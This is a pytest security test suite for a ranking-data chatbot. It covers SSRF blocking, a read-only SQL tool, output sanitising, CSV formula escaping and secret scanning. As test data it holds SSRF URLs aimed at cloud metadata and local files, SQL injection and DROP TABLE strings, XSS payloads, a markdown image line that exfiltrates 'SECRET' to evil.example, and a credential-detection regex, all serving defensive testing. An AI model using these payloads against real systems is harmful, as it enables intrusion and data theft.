"""Attack surface: the chatbot's tools, input validation, output encoding, configuration and secrets."""
from __future__ import annotations

import json
import re
import subprocess
import time
import tomllib
from pathlib import Path

import pandas as pd
import pytest

import live_estimate as LE
import live_store
from rag import chat

ROOT = Path(__file__).resolve().parents[1]


# ---------- SSRF: the web-fetch tool must only reach public web sites ----------
@pytest.mark.parametrize("url", [
    "http://localhost/", "http://127.0.0.1:80/", "http://0.0.0.0/", "http://[::1]/", "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/", "http://192.168.1.1/", "http://172.16.0.1/", "http://100.64.0.1/", "http://2130706433/", "http://0x7f000001/",
    "http://127.1/", "http://[::ffff:127.0.0.1]/", "http://localhost:8501/", "https://example.com:8443/",
    "file:///etc/passwd", "ftp://example.com/", "gopher://127.0.0.1:25/", "http://user:pw@example.com/", "javascript:alert(1)",
    "http://metadata.google.internal/", "", "not a url",
])
def test_fetch_refuses_internal_and_odd_urls(url):
    assert chat.check_url(url) is not None
    out = json.loads(chat.fetch_web_page(url))
    assert "error" in out and "text" not in out


def test_fetch_rechecks_every_redirect(monkeypatch):
    """A public page that redirects to an internal address must be refused at the redirect."""
    calls = []

    class Redirect:
        is_redirect, status_code, headers = True, 302, {"location": "http://169.254.169.254/latest/meta-data/"}

        def close(self):
            pass

    monkeypatch.setattr(chat, "_public_host", lambda host, port: host == "public.example")
    monkeypatch.setattr(chat.requests.Session, "get", lambda self, url, **kw: calls.append(url) or Redirect())
    out = json.loads(chat.fetch_web_page("http://public.example/start"))
    assert out["error"].startswith("refused") and calls == ["http://public.example/start"]


def test_fetch_caps_size_and_content_type(monkeypatch):
    class Big:
        is_redirect, status_code, headers = False, 200, {"content-type": "text/html"}

        def raise_for_status(self):
            pass

        def iter_content(self, n):
            while True:
                yield b"x" * n

    class Binary(Big):
        headers = {"content-type": "application/octet-stream"}

    monkeypatch.setattr(chat, "_public_host", lambda host, port: True)
    monkeypatch.setattr(chat.requests.Session, "get", lambda self, url, **kw: Big())
    assert "larger than" in json.loads(chat.fetch_web_page("https://public.example/"))["error"]
    monkeypatch.setattr(chat.requests.Session, "get", lambda self, url, **kw: Binary())
    assert "unsupported content type" in json.loads(chat.fetch_web_page("https://public.example/x.bin"))["error"]


# ---------- the chatbot's SQL tool is read-only and bounded ----------
@pytest.mark.parametrize("sql", [
    "DELETE FROM rankings", "UPDATE rankings SET score=100", "DROP TABLE rankings", "INSERT INTO rankings(year) VALUES (1)",
    "ATTACH DATABASE '/tmp/x.db' AS x", "PRAGMA table_info(rankings)", "SELECT 1; DROP TABLE rankings",
    "WITH t AS (SELECT 1) DELETE FROM rankings", "SELECT load_extension('/tmp/evil')", "CREATE TABLE t(x)",
    "SELECT * FROM app_users", "SELECT * FROM login_events", "SELECT writefile('/tmp/x', 'y')",
])
def test_sql_tool_blocks_writes_and_escapes(sql):
    out = json.loads(chat.query_database(sql))
    assert "error" in out, sql
    assert json.loads(chat.query_database("SELECT COUNT(*) FROM rankings"))["rows"][0][0] > 3000, "data must be intact"


def test_sql_tool_aborts_runaway_queries():
    t = time.monotonic()
    out = json.loads(chat.query_database("WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c) SELECT MAX(x) FROM c"))
    assert "error" in out and time.monotonic() - t < 15


def test_sql_tool_still_answers_normal_questions():
    out = json.loads(chat.query_database('SELECT name, score FROM rankings WHERE year=2025 AND category="Engineering" ORDER BY rank LIMIT 3'))
    assert len(out["rows"]) == 3 and out["columns"] == ["name", "score"]


def test_model_output_cannot_embed_images_or_html():
    evil = 'Here ![x](https://evil.example/?d=SECRET) and ![y][ref] and <img src="https://evil.example/a.png"> done'
    clean = chat.safe_markdown(evil)
    assert "evil.example" not in clean and clean.count("[image removed]") == 3
    assert chat.safe_markdown("a [normal link](https://nirfindia.org) stays") == "a [normal link](https://nirfindia.org) stays"


# ---------- input validation ----------
@pytest.mark.parametrize("values,fragment", [
    ({"scopus_publications_3y": -5}, "between 0"),
    ({"scopus_publications_3y": float("nan")}, "not a number"),
    ({"scopus_publications_3y": float("inf")}, "not a number"),
    ({"faculty_phd_pct": 101}, "between 0"),
    ({"median_salary_ug": 1e12}, "between 0"),
    ({"not_a_field": 1}, "Unknown field"),
    ({"students_female": 7000}, "cannot exceed total students"),
    ({"placed_total": 1200}, "cannot exceed the number who graduated"),
    ({"scopus_publications_3y": 10, "retracted_papers_3y": 11}, "cannot exceed publications"),
])
def test_validation_rejects_bad_input(values, fragment):
    current = {"students_total": 5961, "graduated_total": 1136, "placed_total": 1107, "higher_studies_total": 12}
    problems = LE.validate(values, current)
    assert problems and any(fragment in p for p in problems), problems


def test_validation_accepts_good_input():
    assert LE.validate({"scopus_publications_3y": 1200, "scopus_citations_3y": 9000, "faculty_phd_pct": 60}, {}) == []


# ---------- output encoding ----------
def test_csv_export_neutralises_formulas():
    from common import csv_safe
    df = pd.DataFrame({"note": ["=HYPERLINK(\"http://x\")", "+1", "-2", "@SUM(A1)", "\tx", "fine"], "value": [1, -2, 3, 4, 5, 6]})
    lines = csv_safe(df).decode().splitlines()
    assert lines[1].startswith("\"'=HYPERLINK") and lines[2].startswith("'+1") and lines[3].startswith("'-2")
    assert lines[4].startswith("'@SUM") and lines[6] == "fine,6" and lines[3].endswith(",3") and ",-2" in lines[2]


def test_cards_escape_html(monkeypatch):
    import common
    seen = []
    monkeypatch.setattr(common.st, "markdown", lambda body, **kw: seen.append(body))
    common.card("<script>alert(1)</script>", "<b>x</b>", "<img src=x onerror=alert(1)>")
    assert "<script>" not in seen[0] and "&lt;script&gt;" in seen[0] and "<img" not in seen[0]


# ---------- storage rules ----------
def test_staff_can_only_remove_their_own_entries(users, clean_live):
    live_store.add_entries([("Test Staff", "2025-26", "scopus_publications_3y", 1000.0, "")], "t.staff")
    live_store.add_entries([("Test Other", "2025-26", "scopus_publications_3y", 1500.0, "")], "t.other")
    h = live_store.history(10)
    mine, theirs = int(h[h.username == "t.staff"].id.iloc[0]), int(h[h.username == "t.other"].id.iloc[0])
    assert not live_store.soft_delete(theirs, "t.staff", is_admin=False)
    assert live_store.latest_metrics().value.iloc[0] == 1500.0
    assert live_store.soft_delete(theirs, "t.admin", is_admin=True)
    assert live_store.latest_metrics().value.iloc[0] == 1000.0, "removing the latest restores the previous value"
    assert live_store.soft_delete(mine, "t.staff", is_admin=False)
    assert not live_store.soft_delete(mine, "t.staff", is_admin=False), "cannot remove twice"
    assert live_store.latest_metrics().empty
    audit = live_store.history(10, include_deleted=True)
    assert len(audit) == 2 and set(audit.deleted_by) == {"t.admin", "t.staff"}, "removed rows stay in the audit log"


def test_injection_text_is_stored_as_data(users, clean_live):
    note = "'); DROP TABLE saveetha_live; -- <script>alert(1)</script>"
    live_store.add_entries([("Robert'); DROP TABLE x;--", "2025-26", "phd_pursuing_ft", 80.0, note)], "t.staff")
    h = live_store.history(5)
    assert h.note.iloc[0] == note and h.entered_by.iloc[0].startswith("Robert'")


def test_health_message_never_leaks_connection_details(monkeypatch):
    monkeypatch.setattr(live_store, "run", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("password=hunter2 host=db.internal")))
    ok, msg = live_store.health()
    assert not ok and "hunter2" not in msg and "db.internal" not in msg


# ---------- configuration and secrets ----------
def test_streamlit_production_settings():
    cfg = tomllib.loads((ROOT / ".streamlit" / "config.toml").read_text())
    assert cfg["server"]["enableXsrfProtection"] is True
    assert cfg["server"]["enableStaticServing"] is False
    assert cfg["client"]["showErrorDetails"] == "none"
    assert cfg["client"]["toolbarMode"] == "viewer"


def test_secrets_and_local_data_are_git_ignored():
    for path in (".env", ".streamlit/secrets.toml", "db/local_store.db"):
        r = subprocess.run(["git", "check-ignore", "-q", path], cwd=ROOT)
        assert r.returncode == 0, f"{path} must be git-ignored"


def test_no_credentials_in_tracked_files():
    files = subprocess.run(["git", "ls-files"], cwd=ROOT, capture_output=True, text=True).stdout.split()
    pattern = re.compile(r"gsk_[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{30,}|postgres(?:ql)?://[^\s:@/]+:[^\s@\[\]]{6,}@|sb_secret_[A-Za-z0-9]{10,}")
    for f in files:
        p = ROOT / f
        if p.suffix in {".py", ".md", ".toml", ".txt", ".json", ".sh", ".example", ".cfg", ".yml", ".yaml"} or p.name.startswith(".env"):
            hits = pattern.findall(p.read_text(errors="ignore"))
            assert not hits, f"possible credential in {f}"


def test_auth_tables_are_not_in_the_reference_database():
    import sqlite3
    con = sqlite3.connect(f"file:{ROOT / 'db' / 'nirf.db'}?mode=ro", uri=True)
    names = {r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    assert not {"app_users", "login_events"} & names
